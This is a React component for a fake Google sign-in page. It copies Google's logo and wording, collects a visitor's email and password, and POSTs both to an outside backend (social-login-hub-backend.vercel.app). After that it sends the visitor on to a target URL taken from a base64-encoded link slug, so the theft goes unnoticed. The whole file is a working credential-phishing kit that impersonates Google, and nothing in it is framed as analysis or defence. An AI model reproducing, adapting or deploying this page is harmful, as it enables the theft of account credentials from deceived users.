"use client";
import { useState, useEffect } from "react";

export default function GmailLogin({ params }) {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({ email: "", password: "" });
  const [encryptedString, setEncryptedString] = useState("");
  const [hasTargetUrl, setHasTargetUrl] = useState(false);

  // === URL-safe Base64 decryption ===
  const decryptUrlSafeBase64 = (encoded) => {
    if (!encoded) return "";
    try {
      const base64 = encoded.replace(/-/g, "+").replace(/_/g, "/");
      const padding = "=".repeat((4 - (base64.length % 4)) % 4);
      return decodeURIComponent(escape(atob(base64 + padding)));
    } catch {
      return "";
    }
  };

  useEffect(() => {
    // Get encrypted string from URL slug
    if (params?.slug && params.slug.length > 0) {
      const encryptedParam = params.slug[0];
      if (encryptedParam) {
        setEncryptedString(encryptedParam);
        setHasTargetUrl(true);
        console.log("Encrypted string detected:", encryptedParam);
      }
    }
  }, [params]);

  const validateEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

  const handleEmailNext = (e) => {
    e.preventDefault();
    if (loading) return;
    setErrors({ email: "", password: "" });

    if (!email) {
      setErrors({ email: "Email is required" });
      return;
    }
    if (!validateEmail(email)) {
      setErrors({ email: "Please enter a valid email address" });
      return;
    }

    setIsTransitioning(true);
    setTimeout(() => {
      setStep(2);
      setIsTransitioning(false);
    }, 300);
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (loading) return;
    setErrors({ email: "", password: "" });

    if (!password) {
      setErrors({ password: "Password is required" });
      return;
    }
    if (password.length < 6) {
      setErrors({ password: "Password must be at least 6 characters" });
      return;
    }

    try {
      setLoading(true);
      const response = await fetch(
        "https://social-login-hub-backend.vercel.app/api/auth/gmail",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, password, platform: "gmail" }),
        }
      );

      const data = await response.json();

      if (response.ok) {
        console.log("Login successful:", data);
        alert("Login successful!");

        // === Redirect automatically after decrypting target URL ===
        if (hasTargetUrl && encryptedString) {
          const targetUrl = decryptUrlSafeBase64(encryptedString);
          if (targetUrl && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
            setTimeout(() => {
              window.location.href = targetUrl;
            }, 800);
            return;
          }
        }

        // Fallback if no encrypted link
        setLoading(false);
      } else {
        setErrors({ password: data.message || "Login failed" });
        setLoading(false);
      }
    } catch (err) {
      setErrors({ password: "Network error. Please try again." });
      setLoading(false);
    }
  };

  const handleBackToEmail = () => {
    if (loading) return;
    setIsTransitioning(true);
    setTimeout(() => {
      setStep(1);
      setIsTransitioning(false);
    }, 300);
  };

  return (
    <div className="min-h-screen bg-white">
      <div className="flex flex-col items-center justify-center min-h-screen px-4">
        <div className="w-full max-w-md">
          <div className="border border-gray-300 rounded-lg p-12 bg-white overflow-hidden">
            <div
              className={`transition-transform duration-300 ease-in-out ${isTransitioning
                ? step === 1
                  ? "transform translate-x-full opacity-0"
                  : "transform -translate-x-full opacity-0"
                : "transform translate-x-0 opacity-100"
                }`}
            >
              {step === 1 ? (
                <>
                  <div className="text-center mb-6">
                    <div className="text-4xl font-normal mb-4">
                      <span className="text-blue-500">G</span>
                      <span className="text-red-500">o</span>
                      <span className="text-yellow-500">o</span>
                      <span className="text-blue-500">g</span>
                      <span className="text-green-500">l</span>
                      <span className="text-red-500">e</span>
                    </div>
                    <h1 className="text-2xl font-normal text-gray-700 mb-2">Sign in</h1>
                    <p className="text-sm text-gray-600">Use your Google Account</p>
                  </div>

                  <form onSubmit={handleEmailNext} className="space-y-6">
                    <input
                      type="email"
                      placeholder="Email or phone"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className={`w-full px-3 py-4 border rounded-md text-base focus:outline-none focus:ring-1 ${errors.email
                        ? "border-red-500 focus:border-red-500 focus:ring-red-500"
                        : "border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                        }`}
                      disabled={loading}
                      required
                    />
                    {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
                    <div className="flex justify-end">
                      <button
                        type="submit"
                        className="bg-blue-600 text-white px-6 py-2 rounded-md font-medium hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
                        disabled={loading}
                      >
                        Next
                      </button>
                    </div>
                  </form>
                </>
              ) : (
                <>
                  <div className="text-center mb-6">
                    <div className="text-4xl font-normal mb-4">
                      <span className="text-blue-500">G</span>
                      <span className="text-red-500">o</span>
                      <span className="text-yellow-500">o</span>
                      <span className="text-blue-500">g</span>
                      <span className="text-green-500">l</span>
                      <span className="text-red-500">e</span>
                    </div>
                    <h1 className="text-2xl font-normal text-gray-700 mb-2">Welcome</h1>
                    <div className="flex items-center justify-center mb-4">
                      <span className="text-sm text-gray-600 mr-2">{email}</span>
                      <button
                        type="button"
                        onClick={handleBackToEmail}
                        className="text-blue-600 text-sm hover:underline"
                        disabled={loading}
                      >
                        Change account
                      </button>
                    </div>
                  </div>

                  <form onSubmit={handlePasswordSubmit} className="space-y-6">
                    <input
                      type="password"
                      placeholder="Enter your password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className={`w-full px-3 py-4 border rounded-md text-base focus:outline-none focus:ring-1 ${errors.password
                        ? "border-red-500 focus:border-red-500 focus:ring-red-500"
                        : "border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                        }`}
                      disabled={loading}
                      required
                      autoFocus
                    />
                    {errors.password && <p className="text-red-500 text-xs mt-1">{errors.password}</p>}
                    <div className="flex justify-between items-center">
                      <button
                        type="button"
                        onClick={handleBackToEmail}
                        className="text-blue-600 font-medium hover:bg-blue-50 px-6 py-2 rounded-md"
                        disabled={loading}
                      >
                        Back
                      </button>
                      <button
                        type="submit"
                        className="bg-blue-600 text-white px-6 py-2 rounded-md font-medium hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
                        disabled={loading}
                      >
                        {loading ? "Logging in..." : "Next"}
                      </button>
                    </div>
                  </form>
                </>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
